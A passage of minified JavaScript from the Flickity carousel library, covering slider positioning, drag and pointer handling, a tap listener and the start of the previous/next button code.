            return "string" == typeof t.transform ? "transform" : "WebkitTransform"
        }();
        return s.positionSlider = function() {
            var t = this.x;
            this.options.wrapAround && this.cells.length > 1 && (t = e.modulo(t, this.slideableWidth), t -= this.slideableWidth, this.shiftWrapCells(t)), t += this.cursorPosition, t = this.options.rightToLeft && o ? -t : t;
            var i = this.getPositionValue(t);
            this.slider.style[o] = this.isAnimating ? "translate3d(" + i + ",0,0)" : "translateX(" + i + ")";
            var n = this.slides[0];
            if (n) {
                var s = -this.x - n.target,
                    r = s / this.slidesWidth;
                this.dispatchEvent("scroll", null, [r, s])
            }
        }, s.positionSliderAtSelected = function() {
            this.cells.length && (this.x = -this.selectedSlide.target, this.positionSlider())
        }, s.getPositionValue = function(t) {
            return this.options.percentPosition ? .01 * Math.round(t / this.size.innerWidth * 1e4) + "%" : Math.round(t) + "px"
        }, s.settle = function(t) {
            this.isPointerDown || Math.round(100 * this.x) != Math.round(100 * t) || this.restingFrames++, this.restingFrames > 2 && (this.isAnimating = !1, delete this.isFreeScrolling, this.positionSlider(), this.dispatchEvent("settle"))
        }, s.shiftWrapCells = function(t) {
            var e = this.cursorPosition + t;
            this._shiftCells(this.beforeShiftCells, e, -1);
            var i = this.size.innerWidth - (t + this.slideableWidth + this.cursorPosition);
            this._shiftCells(this.afterShiftCells, i, 1)
        }, s._shiftCells = function(t, e, i) {
            for (var n = 0; n < t.length; n++) {
                var s = t[n],
                    o = e > 0 ? i : 0;
                s.wrapShift(o), e -= s.size.outerWidth
            }
        }, s._unshiftCells = function(t) {
            if (t && t.length)
                for (var e = 0; e < t.length; e++) t[e].wrapShift(0)
        }, s.integratePhysics = function() {
            this.x += this.velocity, this.velocity *= this.getFrictionFactor()
        }, s.applyForce = function(t) {
            this.velocity += t
        }, s.getFrictionFactor = function() {
            return 1 - this.options[this.isFreeScrolling ? "freeScrollFriction" : "friction"]
        }, s.getRestingPosition = function() {
            return this.x + this.velocity / (1 - this.getFrictionFactor())
        }, s.applyDragForce = function() {
            if (this.isPointerDown) {
                var t = this.dragX - this.x,
                    e = t - this.velocity;
                this.applyForce(e)
            }
        }, s.applySelectedAttraction = function() {
            if (!this.isPointerDown && !this.isFreeScrolling && this.cells.length) {
                var t = this.selectedSlide.target * -1 - this.x,
                    e = t * this.options.selectedAttraction;
                this.applyForce(e)
            }
        }, s
    }),
    function(t, e) {
        if ("function" == typeof define && define.amd) define("flickity/js/flickity", ["ev-emitter/ev-emitter", "get-size/get-size", "fizzy-ui-utils/utils", "./cell", "./slide", "./animate"], function(i, n, s, o, r, a) {
            return e(t, i, n, s, o, r, a)
        });
        else if ("object" == typeof module && module.exports) module.exports = e(t, require("ev-emitter"), require("get-size"), require("fizzy-ui-utils"), require("./cell"), require("./slide"), require("./animate"));
        else {
            var i = t.Flickity;
            t.Flickity = e(t, t.EvEmitter, t.getSize, t.fizzyUIUtils, i.Cell, i.Slide, i.animatePrototype)
        }
    }(window, function(t, e, i, n, s, o, r) {
        function a(t, e) {
            for (t = n.makeArray(t); t.length;) e.appendChild(t.shift())
        }

        function h(t, e) {
            var i = n.getQueryElement(t);
            if (!i) return void(d && d.error("Bad element for Flickity: " + (i || t)));
            if (this.element = i, this.element.flickityGUID) {
                var s = f[this.element.flickityGUID];
                return s.option(e), s
            }
            l && (this.$element = l(this.element)), this.options = n.extend({}, this.constructor.defaults), this.option(e), this._create()
        }
        var l = t.jQuery,
            c = t.getComputedStyle,
            d = t.console,
            u = 0,
            f = {};
        h.defaults = {
            accessibility: !0,
            cellAlign: "center",
            freeScrollFriction: .075,
            friction: .28,
            namespaceJQueryEvents: !0,
            percentPosition: !0,
            resize: !0,
            selectedAttraction: .025,
            setGallerySize: !0
        }, h.createMethods = [];
        var p = h.prototype;
        n.extend(p, e.prototype), p._create = function() {
            var e = this.guid = ++u;
            this.element.flickityGUID = e, f[e] = this, this.selectedIndex = 0, this.restingFrames = 0, this.x = 0, this.velocity = 0, this.originSide = this.options.rightToLeft ? "right" : "left", this.viewport = document.createElement("div"), this.viewport.className = "flickity-viewport", this._createSlider(), (this.options.resize || this.options.watchCSS) && t.addEventListener("resize", this), h.createMethods.forEach(function(t) {
                this[t]()
            }, this), this.options.watchCSS ? this.watchCSS() : this.activate()
        }, p.option = function(t) {
            n.extend(this.options, t)
        }, p.activate = function() {
            if (!this.isActive) {
                this.isActive = !0, this.element.classList.add("flickity-enabled"), this.options.rightToLeft && this.element.classList.add("flickity-rtl"), this.getSize();
                var t = this._filterFindCellElements(this.element.children);
                a(t, this.slider), this.viewport.appendChild(this.slider), this.element.appendChild(this.viewport), this.reloadCells(), this.options.accessibility && (this.element.tabIndex = 0, this.element.addEventListener("keydown", this)), this.emitEvent("activate");
                var e, i = this.options.initialIndex;
                e = this.isInitActivated ? this.selectedIndex : void 0 !== i && this.cells[i] ? i : 0, this.select(e, !1, !0), this.isInitActivated = !0
            }
        }, p._createSlider = function() {
            var t = document.createElement("div");
            t.className = "flickity-slider", t.style[this.originSide] = 0, this.slider = t
        }, p._filterFindCellElements = function(t) {
            return n.filterFindElements(t, this.options.cellSelector)
        }, p.reloadCells = function() {
            this.cells = this._makeCells(this.slider.children), this.positionCells(), this._getWrapShiftCells(), this.setGallerySize()
        }, p._makeCells = function(t) {
            var e = this._filterFindCellElements(t),
                i = e.map(function(t) {
                    return new s(t, this)
                }, this);
            return i
        }, p.getLastCell = function() {
            return this.cells[this.cells.length - 1]
        }, p.getLastSlide = function() {
            return this.slides[this.slides.length - 1]
        }, p.positionCells = function() {
            this._sizeCells(this.cells), this._positionCells(0)
        }, p._positionCells = function(t) {
            t = t || 0, this.maxCellHeight = t ? this.maxCellHeight || 0 : 0;
            var e = 0;
            if (t > 0) {
                var i = this.cells[t - 1];
                e = i.x + i.size.outerWidth
            }
            for (var n = this.cells.length, s = t; s < n; s++) {
                var o = this.cells[s];
                o.setPosition(e), e += o.size.outerWidth, this.maxCellHeight = Math.max(o.size.outerHeight, this.maxCellHeight)
            }
            this.slideableWidth = e, this.updateSlides(), this._containSlides(), this.slidesWidth = n ? this.getLastSlide().target - this.slides[0].target : 0
        }, p._sizeCells = function(t) {
            t.forEach(function(t) {
                t.getSize()
            })
        }, p.updateSlides = function() {
            if (this.slides = [], this.cells.length) {
                var t = new o(this);
                this.slides.push(t);
                var e = "left" == this.originSide,
                    i = e ? "marginRight" : "marginLeft",
                    n = this._getCanCellFit();
                this.cells.forEach(function(e, s) {
                    if (!t.cells.length) return void t.addCell(e);
                    var r = t.outerWidth - t.firstMargin + (e.size.outerWidth - e.size[i]);
                    n.call(this, s, r) ? t.addCell(e) : (t.updateTarget(), t = new o(this), this.slides.push(t), t.addCell(e))
                }, this), t.updateTarget(), this.updateSelectedSlide()
            }
        }, p._getCanCellFit = function() {
            var t = this.options.groupCells;
            if (!t) return function() {
                return !1
            };
            if ("number" == typeof t) {
                var e = parseInt(t, 10);
                return function(t) {
                    return t % e !== 0
                }
            }
            var i = "string" == typeof t && t.match(/^(\d+)%$/),
                n = i ? parseInt(i[1], 10) / 100 : 1;
            return function(t, e) {
                return e <= (this.size.innerWidth + 1) * n
            }
        }, p._init = p.reposition = function() {
            this.positionCells(), this.positionSliderAtSelected()
        }, p.getSize = function() {
            this.size = i(this.element), this.setCellAlign(), this.cursorPosition = this.size.innerWidth * this.cellAlign
        };
        var v = {
            center: {
                left: .5,
                right: .5
            },
            left: {
                left: 0,
                right: 1
            },
            right: {
                right: 0,
                left: 1
            }
        };
        return p.setCellAlign = function() {
            var t = v[this.options.cellAlign];
            this.cellAlign = t ? t[this.originSide] : this.options.cellAlign
        }, p.setGallerySize = function() {
            if (this.options.setGallerySize) {
                var t = this.options.adaptiveHeight && this.selectedSlide ? this.selectedSlide.height : this.maxCellHeight;
                this.viewport.style.height = t + "px"
            }
        }, p._getWrapShiftCells = function() {
            if (this.options.wrapAround) {
                this._unshiftCells(this.beforeShiftCells), this._unshiftCells(this.afterShiftCells);
                var t = this.cursorPosition,
                    e = this.cells.length - 1;
                this.beforeShiftCells = this._getGapCells(t, e, -1), t = this.size.innerWidth - this.cursorPosition, this.afterShiftCells = this._getGapCells(t, 0, 1)
            }
        }, p._getGapCells = function(t, e, i) {
            for (var n = []; t > 0;) {
                var s = this.cells[e];
                if (!s) break;
                n.push(s), e += i, t -= s.size.outerWidth
            }
            return n
        }, p._containSlides = function() {
            if (this.options.contain && !this.options.wrapAround && this.cells.length) {
                var t = this.options.rightToLeft,
                    e = t ? "marginRight" : "marginLeft",
                    i = t ? "marginLeft" : "marginRight",
                    n = this.slideableWidth - this.getLastCell().size[i],
                    s = n < this.size.innerWidth,
                    o = this.cursorPosition + this.cells[0].size[e],
                    r = n - this.size.innerWidth * (1 - this.cellAlign);
                this.slides.forEach(function(t) {
                    s ? t.target = n * this.cellAlign : (t.target = Math.max(t.target, o), t.target = Math.min(t.target, r))
                }, this)
            }
        }, p.dispatchEvent = function(t, e, i) {
            var n = e ? [e].concat(i) : i;
            if (this.emitEvent(t, n), l && this.$element) {
                t += this.options.namespaceJQueryEvents ? ".flickity" : "";
                var s = t;
                if (e) {
                    var o = l.Event(e);
                    o.type = t, s = o
                }
                this.$element.trigger(s, i)
            }
        }, p.select = function(t, e, i) {
            this.isActive && (t = parseInt(t, 10), this._wrapSelect(t), (this.options.wrapAround || e) && (t = n.modulo(t, this.slides.length)), this.slides[t] && (this.selectedIndex = t, this.updateSelectedSlide(), i ? this.positionSliderAtSelected() : this.startAnimation(), this.options.adaptiveHeight && this.setGallerySize(), this.dispatchEvent("select"), this.dispatchEvent("cellSelect")))
        }, p._wrapSelect = function(t) {
            var e = this.slides.length,
                i = this.options.wrapAround && e > 1;
            if (!i) return t;
            var s = n.modulo(t, e),
                o = Math.abs(s - this.selectedIndex),
                r = Math.abs(s + e - this.selectedIndex),
                a = Math.abs(s - e - this.selectedIndex);
            !this.isDragSelect && r < o ? t += e : !this.isDragSelect && a < o && (t -= e), t < 0 ? this.x -= this.slideableWidth : t >= e && (this.x += this.slideableWidth)
        }, p.previous = function(t, e) {
            this.select(this.selectedIndex - 1, t, e)
        }, p.next = function(t, e) {
            this.select(this.selectedIndex + 1, t, e)
        }, p.updateSelectedSlide = function() {
            var t = this.slides[this.selectedIndex];
            t && (this.unselectSelectedSlide(), this.selectedSlide = t, t.select(), this.selectedCells = t.cells, this.selectedElements = t.getCellElements(), this.selectedCell = t.cells[0], this.selectedElement = this.selectedElements[0])
        }, p.unselectSelectedSlide = function() {
            this.selectedSlide && this.selectedSlide.unselect()
        }, p.selectCell = function(t, e, i) {
            var n;
            "number" == typeof t ? n = this.cells[t] : ("string" == typeof t && (t = this.element.querySelector(t)), n = this.getCell(t));
            for (var s = 0; n && s < this.slides.length; s++) {
                var o = this.slides[s],
                    r = o.cells.indexOf(n);
                if (r != -1) return void this.select(s, e, i)
            }
        }, p.getCell = function(t) {
            for (var e = 0; e < this.cells.length; e++) {
                var i = this.cells[e];
                if (i.element == t) return i
            }
        }, p.getCells = function(t) {
            t = n.makeArray(t);
            var e = [];
            return t.forEach(function(t) {
                var i = this.getCell(t);
                i && e.push(i)
            }, this), e
        }, p.getCellElements = function() {
            return this.cells.map(function(t) {
                return t.element
            })
        }, p.getParentCell = function(t) {
            var e = this.getCell(t);
            return e ? e : (t = n.getParent(t, ".flickity-slider > *"), this.getCell(t))
        }, p.getAdjacentCellElements = function(t, e) {
            if (!t) return this.selectedSlide.getCellElements();
            e = void 0 === e ? this.selectedIndex : e;
            var i = this.slides.length;
            if (1 + 2 * t >= i) return this.getCellElements();
            for (var s = [], o = e - t; o <= e + t; o++) {
                var r = this.options.wrapAround ? n.modulo(o, i) : o,
                    a = this.slides[r];
                a && (s = s.concat(a.getCellElements()))
            }
            return s
        }, p.uiChange = function() {
            this.emitEvent("uiChange")
        }, p.childUIPointerDown = function(t) {
            this.emitEvent("childUIPointerDown", [t])
        }, p.onresize = function() {
            this.watchCSS(), this.resize()
        }, n.debounceMethod(h, "onresize", 150), p.resize = function() {
            if (this.isActive) {
                this.getSize(), this.options.wrapAround && (this.x = n.modulo(this.x, this.slideableWidth)), this.positionCells(), this._getWrapShiftCells(), this.setGallerySize(), this.emitEvent("resize");
                var t = this.selectedElements && this.selectedElements[0];
                this.selectCell(t, !1, !0)
            }
        }, p.watchCSS = function() {
            var t = this.options.watchCSS;
            if (t) {
                var e = c(this.element, ":after").content;
                e.indexOf("flickity") != -1 ? this.activate() : this.deactivate()
            }
        }, p.onkeydown = function(t) {
            if (this.options.accessibility && (!document.activeElement || document.activeElement == this.element))
                if (37 == t.keyCode) {
                    var e = this.options.rightToLeft ? "next" : "previous";
                    this.uiChange(), this[e]()
                } else if (39 == t.keyCode) {
                    var i = this.options.rightToLeft ? "previous" : "next";
                    this.uiChange(), this[i]()
                }
        }, p.deactivate = function() {
            this.isActive && (this.element.classList.remove("flickity-enabled"), this.element.classList.remove("flickity-rtl"), this.cells.forEach(function(t) {
                t.destroy()
            }), this.unselectSelectedSlide(), this.element.removeChild(this.viewport), a(this.slider.children, this.element), this.options.accessibility && (this.element.removeAttribute("tabIndex"), this.element.removeEventListener("keydown", this)), this.isActive = !1, this.emitEvent("deactivate"))
        }, p.destroy = function() {
            this.deactivate(), t.removeEventListener("resize", this), this.emitEvent("destroy"), l && this.$element && l.removeData(this.element, "flickity"), delete this.element.flickityGUID, delete f[this.guid]
        }, n.extend(p, r), h.data = function(t) {
            t = n.getQueryElement(t);
            var e = t && t.flickityGUID;
            return e && f[e]
        }, n.htmlInit(h, "flickity"), l && l.bridget && l.bridget("flickity", h), h.setJQuery = function(t) {
            l = t
        }, h.Cell = s, h
    }),
    function(t, e) {
        "function" == typeof define && define.amd ? define("unipointer/unipointer", ["ev-emitter/ev-emitter"], function(i) {
            return e(t, i)
        }) : "object" == typeof module && module.exports ? module.exports = e(t, require("ev-emitter")) : t.Unipointer = e(t, t.EvEmitter)
    }(window, function(t, e) {
        function i() {}

        function n() {}
        var s = n.prototype = Object.create(e.prototype);
        s.bindStartEvent = function(t) {
            this._bindStartEvent(t, !0)
        }, s.unbindStartEvent = function(t) {
            this._bindStartEvent(t, !1)
        }, s._bindStartEvent = function(t, e) {
            e = void 0 === e || !!e;
            var i = e ? "addEventListener" : "removeEventListener";
            t[i]("mousedown", this), t[i]("touchstart", this)
        }, s.handleEvent = function(t) {
            var e = "on" + t.type;
            this[e] && this[e](t)
        }, s.getTouch = function(t) {
            for (var e = 0; e < t.length; e++) {
                var i = t[e];
                if (i.identifier == this.pointerIdentifier) return i
            }
        }, s.onmousedown = function(t) {
            var e = t.button;
            e && 0 !== e && 1 !== e || this._pointerDown(t, t)
        }, s.ontouchstart = function(t) {
            this._pointerDown(t, t.changedTouches[0])
        }, s.onpointerdown = function(t) {
            this._pointerDown(t, t)
        }, s._pointerDown = function(t, e) {
            this.isPointerDown || (this.isPointerDown = !0, this.pointerIdentifier = void 0 !== e.pointerId ? e.pointerId : e.identifier, this.pointerDown(t, e))
        }, s.pointerDown = function(t, e) {
            this._bindPostStartEvents(t), this.emitEvent("pointerDown", [t, e])
        };
        var o = {
            mousedown: ["mousemove", "mouseup"],
            touchstart: ["touchmove", "touchend", "touchcancel"],
            pointerdown: ["pointermove", "pointerup", "pointercancel"]
        };
        return s._bindPostStartEvents = function(e) {
            if (e) {
                var i = o[e.type];
                i.forEach(function(e) {
                    t.addEventListener(e, this)
                }, this), this._boundPointerEvents = i
            }
        }, s._unbindPostStartEvents = function() {
            this._boundPointerEvents && (this._boundPointerEvents.forEach(function(e) {
                t.removeEventListener(e, this)
            }, this), delete this._boundPointerEvents)
        }, s.onmousemove = function(t) {
            this._pointerMove(t, t)
        }, s.onpointermove = function(t) {
            t.pointerId == this.pointerIdentifier && this._pointerMove(t, t)
        }, s.ontouchmove = function(t) {
            var e = this.getTouch(t.changedTouches);
            e && this._pointerMove(t, e)
        }, s._pointerMove = function(t, e) {
            this.pointerMove(t, e)
        }, s.pointerMove = function(t, e) {
            this.emitEvent("pointerMove", [t, e])
        }, s.onmouseup = function(t) {
            this._pointerUp(t, t)
        }, s.onpointerup = function(t) {
            t.pointerId == this.pointerIdentifier && this._pointerUp(t, t)
        }, s.ontouchend = function(t) {
            var e = this.getTouch(t.changedTouches);
            e && this._pointerUp(t, e)
        }, s._pointerUp = function(t, e) {
            this._pointerDone(), this.pointerUp(t, e)
        }, s.pointerUp = function(t, e) {
            this.emitEvent("pointerUp", [t, e])
        }, s._pointerDone = function() {
            this.isPointerDown = !1, delete this.pointerIdentifier, this._unbindPostStartEvents(), this.pointerDone()
        }, s.pointerDone = i, s.onpointercancel = function(t) {
            t.pointerId == this.pointerIdentifier && this._pointerCancel(t, t)
        }, s.ontouchcancel = function(t) {
            var e = this.getTouch(t.changedTouches);
            e && this._pointerCancel(t, e)
        }, s._pointerCancel = function(t, e) {
            this._pointerDone(), this.pointerCancel(t, e)
        }, s.pointerCancel = function(t, e) {
            this.emitEvent("pointerCancel", [t, e])
        }, n.getPointerPoint = function(t) {
            return {
                x: t.pageX,
                y: t.pageY
            }
        }, n
    }),
    function(t, e) {
        "function" == typeof define && define.amd ? define("unidragger/unidragger", ["unipointer/unipointer"], function(i) {
            return e(t, i)
        }) : "object" == typeof module && module.exports ? module.exports = e(t, require("unipointer")) : t.Unidragger = e(t, t.Unipointer)
    }(window, function(t, e) {
        function i() {}
        var n = i.prototype = Object.create(e.prototype);
        return n.bindHandles = function() {
            this._bindHandles(!0)
        }, n.unbindHandles = function() {
            this._bindHandles(!1)
        }, n._bindHandles = function(e) {
            e = void 0 === e || !!e;
            for (var i = e ? "addEventListener" : "removeEventListener", n = 0; n < this.handles.length; n++) {
                var s = this.handles[n];
                this._bindStartEvent(s, e), s[i]("click", this), t.PointerEvent && (s.style.touchAction = e ? this._touchActionValue : "")
            }
        }, n._touchActionValue = "none", n.pointerDown = function(t, e) {
            if ("INPUT" == t.target.nodeName && "range" == t.target.type) return this.isPointerDown = !1, void delete this.pointerIdentifier;
            this._dragPointerDown(t, e);
            var i = document.activeElement;
            i && i.blur && i.blur(), this._bindPostStartEvents(t), this.emitEvent("pointerDown", [t, e])
        }, n._dragPointerDown = function(t, i) {
            this.pointerDownPoint = e.getPointerPoint(i);
            var n = this.canPreventDefaultOnPointerDown(t, i);
            n && t.preventDefault()
        }, n.canPreventDefaultOnPointerDown = function(t) {
            return "SELECT" != t.target.nodeName
        }, n.pointerMove = function(t, e) {
            var i = this._dragPointerMove(t, e);
            this.emitEvent("pointerMove", [t, e, i]), this._dragMove(t, e, i)
        }, n._dragPointerMove = function(t, i) {
            var n = e.getPointerPoint(i),
                s = {
                    x: n.x - this.pointerDownPoint.x,
                    y: n.y - this.pointerDownPoint.y
                };
            return !this.isDragging && this.hasDragStarted(s) && this._dragStart(t, i), s
        }, n.hasDragStarted = function(t) {
            return Math.abs(t.x) > 3 || Math.abs(t.y) > 3
        }, n.pointerUp = function(t, e) {
            this.emitEvent("pointerUp", [t, e]), this._dragPointerUp(t, e)
        }, n._dragPointerUp = function(t, e) {
            this.isDragging ? this._dragEnd(t, e) : this._staticClick(t, e)
        }, n._dragStart = function(t, i) {
            this.isDragging = !0, this.dragStartPoint = e.getPointerPoint(i), this.isPreventingClicks = !0, this.dragStart(t, i)
        }, n.dragStart = function(t, e) {
            this.emitEvent("dragStart", [t, e])
        }, n._dragMove = function(t, e, i) {
            this.isDragging && this.dragMove(t, e, i)
        }, n.dragMove = function(t, e, i) {
            t.preventDefault(), this.emitEvent("dragMove", [t, e, i])
        }, n._dragEnd = function(t, e) {
            this.isDragging = !1, setTimeout(function() {
                delete this.isPreventingClicks
            }.bind(this)), this.dragEnd(t, e)
        }, n.dragEnd = function(t, e) {
            this.emitEvent("dragEnd", [t, e])
        }, n.onclick = function(t) {
            this.isPreventingClicks && t.preventDefault()
        }, n._staticClick = function(t, e) {
            if (!this.isIgnoringMouseUp || "mouseup" != t.type) {
                var i = t.target.nodeName;
                "INPUT" != i && "TEXTAREA" != i || t.target.focus(), this.staticClick(t, e), "mouseup" != t.type && (this.isIgnoringMouseUp = !0, setTimeout(function() {
                    delete this.isIgnoringMouseUp
                }.bind(this), 400))
            }
        }, n.staticClick = function(t, e) {
            this.emitEvent("staticClick", [t, e])
        }, i.getPointerPoint = e.getPointerPoint, i
    }),
    function(t, e) {
        "function" == typeof define && define.amd ? define("flickity/js/drag", ["./flickity", "unidragger/unidragger", "fizzy-ui-utils/utils"], function(i, n, s) {
            return e(t, i, n, s)
        }) : "object" == typeof module && module.exports ? module.exports = e(t, require("./flickity"), require("unidragger"), require("fizzy-ui-utils")) : t.Flickity = e(t, t.Flickity, t.Unidragger, t.fizzyUIUtils)
    }(window, function(t, e, i, n) {
        function s(t) {
            var e = d[t.type],
                i = u[t.target.nodeName];
            return e || i
        }

        function o() {
            return {
                x: t.pageXOffset,
                y: t.pageYOffset
            }
        }
        n.extend(e.defaults, {
            draggable: !0,
            dragThreshold: 3
        }), e.createMethods.push("_createDrag");
        var r = e.prototype;
        n.extend(r, i.prototype), r._touchActionValue = "pan-y";
        var a = "createTouch" in document,
            h = !1;
        r._createDrag = function() {
            this.on("activate", this.bindDrag), this.on("uiChange", this._uiChangeDrag), this.on("childUIPointerDown", this._childUIPointerDownDrag), this.on("deactivate", this.unbindDrag), a && !h && (t.addEventListener("touchmove", function() {}), h = !0)
        }, r.bindDrag = function() {
            this.options.draggable && !this.isDragBound && (this.element.classList.add("is-draggable"), this.handles = [this.viewport], this.bindHandles(), this.isDragBound = !0)
        }, r.unbindDrag = function() {
            this.isDragBound && (this.element.classList.remove("is-draggable"), this.unbindHandles(), delete this.isDragBound)
        }, r._uiChangeDrag = function() {
            delete this.isFreeScrolling
        }, r._childUIPointerDownDrag = function(t) {
            t.preventDefault(), this.pointerDownFocus(t)
        };
        var l = {
                TEXTAREA: !0,
                INPUT: !0,
                OPTION: !0
            },
            c = {
                radio: !0,
                checkbox: !0,
                button: !0,
                submit: !0,
                image: !0,
                file: !0
            };
        r.pointerDown = function(e, i) {
            var n = l[e.target.nodeName] && !c[e.target.type];
            if (n) return this.isPointerDown = !1, void delete this.pointerIdentifier;
            this._dragPointerDown(e, i);
            var s = document.activeElement;
            s && s.blur && s != this.element && s != document.body && s.blur(), this.pointerDownFocus(e), this.dragX = this.x, this.viewport.classList.add("is-pointer-down"), this._bindPostStartEvents(e), this.pointerDownScroll = o(), t.addEventListener("scroll", this), this.dispatchEvent("pointerDown", e, [i])
        }, r.pointerDownFocus = function(e) {
            var i = s(e);
            if (this.options.accessibility && !i) {
                var n = t.pageYOffset;
                this.element.focus(), t.pageYOffset != n && t.scrollTo(t.pageXOffset, n)
            }
        };
        var d = {
                touchstart: !0,
                pointerdown: !0
            },
            u = {
                INPUT: !0,
                SELECT: !0
            };
        return r.canPreventDefaultOnPointerDown = function(t) {
            var e = s(t);
            return !e
        }, r.hasDragStarted = function(t) {
            return Math.abs(t.x) > this.options.dragThreshold
        }, r.pointerUp = function(t, e) {
            delete this.isTouchScrolling, this.viewport.classList.remove("is-pointer-down"), this.dispatchEvent("pointerUp", t, [e]), this._dragPointerUp(t, e)
        }, r.pointerDone = function() {
            t.removeEventListener("scroll", this), delete this.pointerDownScroll
        }, r.dragStart = function(e, i) {
            this.dragStartPosition = this.x, this.startAnimation(), t.removeEventListener("scroll", this), this.dispatchEvent("dragStart", e, [i])
        }, r.pointerMove = function(t, e) {
            var i = this._dragPointerMove(t, e);
            this.dispatchEvent("pointerMove", t, [e, i]), this._dragMove(t, e, i)
        }, r.dragMove = function(t, e, i) {
            t.preventDefault(), this.previousDragX = this.dragX;
            var n = this.options.rightToLeft ? -1 : 1,
                s = this.dragStartPosition + i.x * n;
            if (!this.options.wrapAround && this.slides.length) {
                var o = Math.max(-this.slides[0].target, this.dragStartPosition);
                s = s > o ? .5 * (s + o) : s;
                var r = Math.min(-this.getLastSlide().target, this.dragStartPosition);
                s = s < r ? .5 * (s + r) : s
            }
            this.dragX = s, this.dragMoveTime = new Date, this.dispatchEvent("dragMove", t, [e, i])
        }, r.dragEnd = function(t, e) {
            this.options.freeScroll && (this.isFreeScrolling = !0);
            var i = this.dragEndRestingSelect();
            if (this.options.freeScroll && !this.options.wrapAround) {
                var n = this.getRestingPosition();
                this.isFreeScrolling = -n > this.slides[0].target && -n < this.getLastSlide().target
            } else this.options.freeScroll || i != this.selectedIndex || (i += this.dragEndBoostSelect());
            delete this.previousDragX, this.isDragSelect = this.options.wrapAround, this.select(i), delete this.isDragSelect, this.dispatchEvent("dragEnd", t, [e])
        }, r.dragEndRestingSelect = function() {
            var t = this.getRestingPosition(),
                e = Math.abs(this.getSlideDistance(-t, this.selectedIndex)),
                i = this._getClosestResting(t, e, 1),
                n = this._getClosestResting(t, e, -1),
                s = i.distance < n.distance ? i.index : n.index;
            return s
        }, r._getClosestResting = function(t, e, i) {
            for (var n = this.selectedIndex, s = 1 / 0, o = this.options.contain && !this.options.wrapAround ? function(t, e) {
                return t <= e
            } : function(t, e) {
                return t < e
            }; o(e, s) && (n += i, s = e, e = this.getSlideDistance(-t, n), null !== e);) e = Math.abs(e);
            return {
                distance: s,
                index: n - i
            }
        }, r.getSlideDistance = function(t, e) {
            var i = this.slides.length,
                s = this.options.wrapAround && i > 1,
                o = s ? n.modulo(e, i) : e,
                r = this.slides[o];
            if (!r) return null;
            var a = s ? this.slideableWidth * Math.floor(e / i) : 0;
            return t - (r.target + a)
        }, r.dragEndBoostSelect = function() {
            if (void 0 === this.previousDragX || !this.dragMoveTime || new Date - this.dragMoveTime > 100) return 0;
            var t = this.getSlideDistance(-this.dragX, this.selectedIndex),
                e = this.previousDragX - this.dragX;
            return t > 0 && e > 0 ? 1 : t < 0 && e < 0 ? -1 : 0
        }, r.staticClick = function(t, e) {
            var i = this.getParentCell(t.target),
                n = i && i.element,
                s = i && this.cells.indexOf(i);
            this.dispatchEvent("staticClick", t, [e, n, s])
        }, r.onscroll = function() {
            var t = o(),
                e = this.pointerDownScroll.x - t.x,
                i = this.pointerDownScroll.y - t.y;
            (Math.abs(e) > 3 || Math.abs(i) > 3) && this._pointerDone()
        }, e
    }),
    function(t, e) {
        "function" == typeof define && define.amd ? define("tap-listener/tap-listener", ["unipointer/unipointer"], function(i) {
            return e(t, i)
        }) : "object" == typeof module && module.exports ? module.exports = e(t, require("unipointer")) : t.TapListener = e(t, t.Unipointer)
    }(window, function(t, e) {
        function i(t) {
            this.bindTap(t)
        }
        var n = i.prototype = Object.create(e.prototype);
        return n.bindTap = function(t) {
            t && (this.unbindTap(), this.tapElement = t, this._bindStartEvent(t, !0))
        }, n.unbindTap = function() {
            this.tapElement && (this._bindStartEvent(this.tapElement, !0), delete this.tapElement)
        }, n.pointerUp = function(i, n) {
            if (!this.isIgnoringMouseUp || "mouseup" != i.type) {
                var s = e.getPointerPoint(n),
                    o = this.tapElement.getBoundingClientRect(),
                    r = t.pageXOffset,
                    a = t.pageYOffset,
                    h = s.x >= o.left + r && s.x <= o.right + r && s.y >= o.top + a && s.y <= o.bottom + a;
                if (h && this.emitEvent("tap", [i, n]), "mouseup" != i.type) {
                    this.isIgnoringMouseUp = !0;
                    var l = this;
                    setTimeout(function() {
                        delete l.isIgnoringMouseUp
                    }, 400)
                }
            }
        }, n.destroy = function() {
            this.pointerDone(), this.unbindTap()
        }, i
    }),
    function(t, e) {
        "function" == typeof define && define.amd ? define("flickity/js/prev-next-button", ["./flickity", "tap-listener/tap-listener", "fizzy-ui-utils/utils"], function(i, n, s) {
            return e(t, i, n, s)
        }) : "object" == typeof module && module.exports ? module.exports = e(t, require("./flickity"), require("tap-listener"), require("fizzy-ui-utils")) : e(t, t.Flickity, t.TapListener, t.fizzyUIUtils)
    }(window, function(t, e, i, n) {
        "use strict";

        function s(t, e) {
            this.direction = t, this.parent = e, this._create()
        }

        function o(t) {
            return "string" == typeof t ? t : "M " + t.x0 + ",50 L " + t.x1 + "," + (t.y1 + 50) + " L " + t.x2 + "," + (t.y2 + 50) + " L " + t.x3 + ",50  L " + t.x2 + "," + (50 - t.y2) + " L " + t.x1 + "," + (50 - t.y1) + " Z"
        }
        var r = "http://www.w3.org/2000/svg";
        s.prototype = new i, s.prototype._create = function() {
            this.isEnabled = !0, this.isPrevious = this.direction == -1;
            var t = this.parent.options.rightToLeft ? 1 : -1;
            this.isLeft = this.direction == t;
            var e = this.element = document.createElement("button");
            e.className = "flickity-prev-next-button", e.className += this.isPrevious ? " previous" : " next", e.setAttribute("type", "button"), this.disable(), e.setAttribute("aria-label", this.isPrevious ? "previous" : "next");
            var i = this.createSVG();
            e.appendChild(i), this.on("tap", this.onTap), this.parent.on("select", this.update.bind(this)), this.on("pointerDown", this.parent.childUIPointerDown.bind(this.parent))
        }, s.prototype.activate = function() {
            this.bindTap(this.element), this.element.addEventListener("click", this), this.parent.element.appendChild(this.element)
        }, s.prototype.deactivate = function() {
            this.parent.element.removeChild(this.element), i.prototype.destroy.call(this), this.element.removeEventListener("click", this)
        }, s.prototype.createSVG = function() {
            var t = document.createElementNS(r, "svg");
            t.setAttribute("viewBox", "0 0 100 100");
            var e = document.createElementNS(r, "path"),
                i = o(this.parent.options.arrowShape);
            return e.setAttribute("d", i), e.setAttribute("class", "arrow"), this.isLeft || e.setAttribute("transform", "translate(100, 100) rotate(180) "), t.appendChild(e), t
        }, s.prototype.onTap = function() {
            if (this.isEnabled) {
                this.parent.uiChange();
                var t = this.isPrevious ? "previous" : "next";
                this.parent[t]()
            }
        }, s.prototype.handleEvent = n.handleEvent, s.prototype.onclick = function() {
            var t = document.activeElement;
            t && t == this.element && this.onTap()
        }, s.prototype.enable = function() {
            this.isEnabled || (this.element.disabled = !1, this.isEnabled = !0)
